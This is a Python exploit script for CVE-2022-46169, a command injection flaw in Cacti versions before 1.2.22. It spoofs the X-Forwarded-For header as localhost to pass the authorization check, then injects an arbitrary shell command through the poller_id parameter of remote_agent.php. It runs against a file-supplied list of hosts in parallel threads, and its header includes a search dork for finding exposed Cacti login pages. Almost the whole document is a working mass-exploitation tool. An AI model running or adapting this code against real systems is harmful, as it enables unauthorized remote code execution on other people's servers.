# Exploit Title: Cacti Command Injection 2022
# Dork: title: "<title>Login to Cacti</title>"
# Date: 12/24/2022
# Found By: Hardik-Solanki
# Exploit Author: Inplex-sys
# Vendor Homepage: https://www.cacti.net
# Software Link: https://www.cacti.net/info/downloads
# Version: prior to 1.2.22
# Tested on: Linux
# CVE : CVE-2022-46169

import requests
import urllib3, urllib
import string
import sys
import colored

from datetime import datetime
import random
import threading
from colored import stylize

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Main:
    def formatConsoleDate( date ):
        return '[' + date.strftime('%Y-%m-%d-%H:%M:%S') + ']'
        pass

    def randomString( size ):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))
        pass

class Exploit:
    def __init__(self, host):
        self.host = host
        pass

    def run(self):
        global params
        headers = {
            'X-Forwarded-For': '127.0.0.1'
        }

        try:
            httpResponse = requests.get(self.host + '/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;'+ params['command'], headers=headers, verify=False)
            if httpResponse.status_code == 404:
                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                    stylize(f" [error] {self.host} is not vulnerable", colored.fg('red')))
                pass
            
            if 'FATAL: You are not authorized to use this service' in httpResponse.text:
                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                    stylize(f" [error] {self.host} is not vulnerable", colored.fg('red')))
                return False
                pass

            if 'local_data_id' in httpResponse.text:
                print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                    stylize(f" [info] {self.host} appears to be vulnerable", colored.fg('blue')))
                pass
        except:
            pass
        pass

def main():
    global params

    print(stylize('''
                 ╦ ╦╔═╗╦═╗╔═╗╔╗ 
                 ╠═╣║ ╦╠╦╝╠═╣╠╩╗
                 ╩ ╩╚═╝╩╚═╩ ╩╚═╝
            test first, analyze after
    ''', colored.fg('red')))

    if len(sys.argv) < 3:
        print(stylize("""
    [ERROR]""", colored.fg('red'),
                      colored.attr('underlined'))
              + """ bad command usage
            """ + stylize("Usage Sheme:", colored.fg('#ffe900'),
                          colored.attr('underlined')) + """
                - user@some_name:~# python3 main.py <vuln-list> <command>
        """)
        sys.exit()

    params = {}
    params['file'] = sys.argv[1]
    params['command'] = sys.argv[2]

    with open(params['file'], 'r') as file:
        for line in file:
            host = line.strip()
            exploit = Exploit(host)
            threading.Thread(target=exploit.run).start()
            pass
        pass
    pass

if __name__ == '__main__':
    main()
